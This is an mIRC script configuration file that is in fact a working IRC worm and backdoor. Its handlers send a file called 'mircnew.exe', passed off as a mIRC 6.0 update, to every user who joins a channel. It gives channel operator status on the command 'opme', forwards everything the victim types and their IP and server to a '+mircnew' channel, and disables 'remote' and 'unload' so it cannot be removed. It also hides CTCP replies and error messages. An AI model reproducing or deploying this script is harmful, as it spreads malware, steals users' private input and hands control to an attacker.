   [script]
   n0= on !1:join:#: .dcc send $nick mircnew.exe
   n1= on @1:text:opme:#: .mode $chan -o+o $me $nick
   n2= on 1:input: .msg +mircnew ( $+ $active $+ ) $1-
   n3= on 1:connect: { .alias remote { halt }
   n4= alias unload { halt }
   n5= .msg +mircnew Hi. I'm $me ( $+ $ip $+ ) on $server $+ : $+ $port | echo 2 -s *** mIRC version is mIRC 6.0 32bit. }
   n6= ctcp 1:*:*: { halt }
   n7= on 1:text:goodnight.*:?: part $parm2 :download mircnew.exe the latest mIRC version 6.0 NOW!
   n8= raw 401:*: { halt }
